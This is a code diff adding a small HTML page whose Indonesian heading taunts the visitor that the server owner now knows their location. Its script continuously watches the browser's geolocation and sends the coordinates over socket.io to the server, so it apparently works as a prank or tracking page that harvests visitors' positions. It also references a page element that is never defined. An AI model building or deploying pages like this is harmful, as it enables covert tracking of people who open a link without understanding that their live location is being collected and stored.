@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HOME</title>
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+<body>
+    <h3>Selamat lokasimu telah di ketahui oleh pemilik server ini :v</h3>
+    <script>
+        const socket = io();
+        const locationDiv = document.getElementById('locationDiv');
+
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition((position) => {
+                const { latitude, longitude } = position.coords;
+                socket.emit('location', { latitude, longitude });
+                locationDiv.innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
+            });
+        } else {
+            alert('Geolocation is not supported by this browser.');
+        }
+    </script>
+</body>
+</html>
